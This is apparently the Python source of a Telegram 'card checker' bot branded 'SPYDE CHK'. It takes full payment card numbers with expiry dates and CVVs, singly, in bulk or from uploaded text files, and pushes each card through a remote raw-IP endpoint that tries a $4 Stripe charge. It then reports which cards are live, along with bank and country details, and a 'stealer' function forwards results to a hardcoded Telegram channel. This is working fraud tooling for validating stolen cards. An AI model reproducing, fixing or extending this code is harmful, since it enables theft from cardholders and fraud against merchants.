import httpx
import time
import asyncio
import re
import os
from pyrogram import Client, filters
from FUNC.usersdb_func import *
from FUNC.defs import *
from TOOLS.check_all_func import *
from TOOLS.getbin import *
from BOT.tools.hit_stealer import send_hit_if_approved

# Updated Stealer Channel ID
STEALER_CHANNEL_ID = -1003627495953
MAX_MSC_LIMIT = 10 
MAX_TSC_LIMIT = 100

async def send_hit_if_approved(client: Client, text: str):
    try:
        await client.send_message(chat_id=STEALER_CHANNEL_ID, text=text)
    except Exception as e:
        print(f"[Stealer Error] Failed to forward: {e}")

async def call_stripe_api(fullcc):
    endpoint_url = f"http://138.128.240.15:8020/stripe_charge3?cc={fullcc}"
    async with httpx.AsyncClient(timeout=45, follow_redirects=True) as session:
        for attempt in range(2):
            try:
                response_obj = await session.get(endpoint_url)
                result_json = response_obj.json()
                
                api_status = result_json.get("status", "Unknown").upper()
                response_msg = result_json.get("message", "No response message")
                gate_name = result_json.get("gate", "Stripe Charge $4")
                
                if "APPROVED" in api_status or "SUCCESS" in api_status:
                    return "𝘾𝙃𝘼𝙍𝙂𝙀𝘿 🔥", response_msg, gate_name
                elif "DECLINED" in api_status or "FAILED" in api_status or "FRAUDULENT" in api_status:
                    return "𝘿𝙀𝘾𝙇𝙄𝙉𝙀𝘿 ❌", response_msg, gate_name
                else:
                    return api_status, response_msg, gate_name
            except:
                if attempt == 1:
                    return "Error", "Request failed", "Stripe Charge $4"
                await asyncio.sleep(1)
    return "Error", "Request failed", "Stripe Charge $4"

def extract_cards(text):
    pattern = r"\d{15,16}\|\d{1,2}\|\d{2,4}\|\d{3,4}"
    return re.findall(pattern, text)

# --- SINGLE CHECK COMMAND ---
@Client.on_message(filters.command("sc", [".", "/"]))
async def stripe_charge_cmd(Client, message):
    try:
        user_id = str(message.from_user.id)
        first_name = message.from_user.first_name
        checkall = await check_all_thing(Client, message)
        
        if checkall[0] == False:
            return
        role = checkall[1]
        getcc = await getmessage(message)
        
        if getcc == False:
            resp = f"〈<a href='tg://user?id={user_id}'>{first_name}</a>〉-» Stripe Charge $3.50 - CHECK\n\n〈♻️〉𝙂𝙖𝙩𝙚𝙬𝙖𝙮 -» Stripe Charge $4 \n\n<a href='tg://user?id={user_id}'>╰┈➤</a> 𝙁𝙤𝙧𝙢𝙖𝙩 -» /sc cc|month|year|cvc"
            await message.reply_text(resp, quote=True)
            return
            
        cc, mes, ano, cvv = getcc[0], getcc[1], getcc[2], getcc[3]
        fullcc = f"{cc}|{mes}|{ano}|{cvv}"
        
        loading_msg = await message.reply("🍳", quote=True)
        start = time.perf_counter()
        await asyncio.sleep(2)
        
        status, response, gateway = await call_stripe_api(fullcc)
        
        getbin = await get_bin_details(cc)
        brand, type_, level, bank, country, flag, currency = getbin[0], getbin[1], getbin[2], getbin[3], getbin[4], getbin[5], getbin[6]
        
        elapsed_time = round(time.perf_counter() - start, 2)
        owner_link = '<a href="tg://user?id=8340881349">𝗦𝗣𝗜𝗗𝗘𝗥</a>'
        
        finalresp = f"""{status}
𝗖𝗖 ⇾ {fullcc}
𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ {gateway}
𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {response}
━━━〔 INFO 〕━━━
𝗕𝗜𝗡 𝗜𝗻𝗳𝗼 ⇾ {brand} - {type_} - {level}
𝗕𝗮𝗻𝗸 ⇾ {bank}
𝗖𝗼𝘂𝗻𝘁𝗿𝘆 ⇾ {country} {flag}
━━━〔 INFO 〕━━━
𝗧𝗶𝗺𝗲 ⇾ {elapsed_time:.2f}s
𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗯𝘆 ⇾ <a href='tg://user?id={message.from_user.id}'>{message.from_user.first_name}</a> [ {role} ]
𝗢𝘄𝗻𝗲𝗿 ⇾{owner_link}
╚━━━━━━「𝐒𝐏𝐘𝐃𝐄 𝐂𝐇𝐊」━━━━━━╝
"""
        try: await loading_msg.delete()
        except: pass
            
        await message.reply_text(finalresp, quote=True)
        await setantispamtime(user_id)
        await deductcredit(user_id)
        if "𝘼𝙋𝙋𝙍𝙊𝙑𝙀𝘿" in status or "𝘾𝙃𝘼𝙍𝙂𝙀𝘿" in status:
            await sendcc(finalresp, session)
    except Exception:
        import traceback
        await error_log(traceback.format_exc())

# --- MASS TEXT/REPLY COMMAND ---
@Client.on_message(filters.command("msc", [".", "/"]))
async def stripe_mass_check_cmd(Client, message):
    try:
        user_id = str(message.from_user.id)
        first_name = message.from_user.first_name
        checkall = await check_all_thing(Client, message)
        if not checkall[0]: return
        role = checkall[1]

        ccs = []
        if message.reply_to_message:
            reply_text = message.reply_to_message.text or message.reply_to_message.caption or ""
            ccs = extract_cards(reply_text)
        else:
            ccs = extract_cards(message.text)

        if not ccs:
            resp = f"〈<a href='tg://user?id={user_id}'>{first_name}</a>〉-» Stripe Charge $4 - MASS\n\n〈♻️〉𝙂𝙖𝙩𝙚𝙬𝙖𝙮 -» Stripe Charge $4 \n\n<a href='tg://user?id={user_id}'>╰┈➤</a> 𝙁𝙤𝙧𝙢𝙖𝙩 -» Reply to cards or /msc cc|mm|yy|cvc (up to {MAX_MSC_LIMIT})"
            await message.reply_text(resp, quote=True)
            return

        if len(ccs) > MAX_MSC_LIMIT:
            await message.reply(f"⚠️ Only the first {MAX_MSC_LIMIT} cards will be processed.", quote=True)
            ccs = ccs[:MAX_MSC_LIMIT]

        await process_sequential_check(Client, message, ccs, user_id, first_name, role)
    except Exception:
        import traceback
        await error_log(traceback.format_exc())

# --- TXT FILE COMMAND ---
@Client.on_message(filters.command("tsc", [".", "/"]))
async def stripe_txt_check_cmd(Client, message):
    try:
        user_id = str(message.from_user.id)
        first_name = message.from_user.first_name
        checkall = await check_all_thing(Client, message)
        if not checkall[0]: return
        role = checkall[1]

        target_message = None
        # Case 1: Reply to a document
        if message.reply_to_message and message.reply_to_message.document:
            target_message = message.reply_to_message
        # Case 2: Uploaded directly as caption
        elif message.document:
            target_message = message

        if not target_message or not target_message.document.file_name.endswith('.txt'):
            resp = f"〈<a href='tg://user?id={user_id}'>{first_name}</a>〉-» Stripe Charge $4 - TXT\n\n〈♻️〉𝙂𝙖𝙩𝙚𝙬𝙖𝙮 -» Stripe Charge $4 \n\n<a href='tg://user?id={user_id}'>╰┈➤</a> 𝙁𝙤𝙧𝙢𝙖𝙩 -» Upload a .txt file with /tsc caption or reply to a .txt file with /tsc (up to {MAX_TSC_LIMIT})"
            await message.reply_text(resp, quote=True)
            return

        file_path = await Client.download_media(target_message)
        with open(file_path, 'r', encoding='utf-8') as f:
            content = f.read()
            ccs = extract_cards(content)
        os.remove(file_path)

        if not ccs:
            await message.reply("❌ No valid cards found in the file.", quote=True)
            return

        if len(ccs) > MAX_TSC_LIMIT:
            await message.reply(f"⚠️ Only the first {MAX_TSC_LIMIT} cards will be processed.", quote=True)
            ccs = ccs[:MAX_TSC_LIMIT]

        await process_sequential_check(Client, message, ccs, user_id, first_name, role)
    except Exception:
        import traceback
        await error_log(traceback.format_exc())

# --- SEQUENTIAL ONE-BY-ONE PROCESSING LOGIC ---
async def process_sequential_check(Client, message, ccs, user_id, first_name, role):
    initial_resp = f"""
- Gateway - Stripe Charge $4
- CC Amount - {len(ccs)}
- Checked - Checking CC For {first_name}
- Status - Processing...⌛️
"""
    progress_msg = await message.reply(initial_resp, quote=True)
    header_text = f"<b>↯ Stripe Charge $4 💎\nNumber Of CC Check : [{len(ccs)}]\n</b>\n"
    final_text = header_text
    start_time = time.perf_counter()
    
    for fullcc in ccs:
        status, response, gateway = await call_stripe_api(fullcc)
        
        cc_num = fullcc.split('|')[0]
        getbin = await get_bin_details(cc_num)
        brand, type_, level, bank, country, flag = getbin[0], getbin[1], getbin[2], getbin[3], getbin[4], getbin[5]
        
        card_resp = f"""{status}
━━━━━━━━━━━━━
[ϟ] 𝗖𝗖 - <code>{fullcc}</code>
[ϟ] 𝗦𝘁𝗮𝘁𝘂𝘀 : {response}
[ϟ] 𝗚𝗮𝘁𝗲  - {gateway}
━━━━━━━━━━━━━
[ϟ] B𝗶𝗻 : {cc_num[:6]}
[ϟ] 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 : {country} {flag}
[ϟ] 𝗜𝘀𝘀𝘂𝗲𝗿 : {bank}
[ϟ] 𝗧𝘆𝗽𝗲 : {brand} | {type_} - {level}
\n"""
        final_text += card_resp
        
        try:
            await progress_msg.edit_text(final_text, disable_web_page_preview=True)
        except:
            pass
        
        await asyncio.sleep(0.5)

    elapsed_time = round(time.perf_counter() - start_time, 2)
    owner_link = '<a href="tg://user?id=8340881349">𝗦𝗣𝗜𝗗𝗘𝗥</a>'
    footer = f"""━━━━━━━━━━━━━
[ϟ] T/t : {elapsed_time}s | Proxy : Live ✨
[ϟ] 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗯𝘆: <a href='tg://user?id={user_id}'> {first_name}</a> [ {role} ]
[ϟ] 𝗢𝘄𝗻𝗲𝗿: {owner_link}
╚━━━━━━「𝐒𝐏𝐘𝐃𝐄 𝐂𝐇𝐊」━━━━━━╝"""
    
    final_text += footer
    await progress_msg.edit_text(final_text, disable_web_page_preview=True)
    await setantispamtime(user_id)
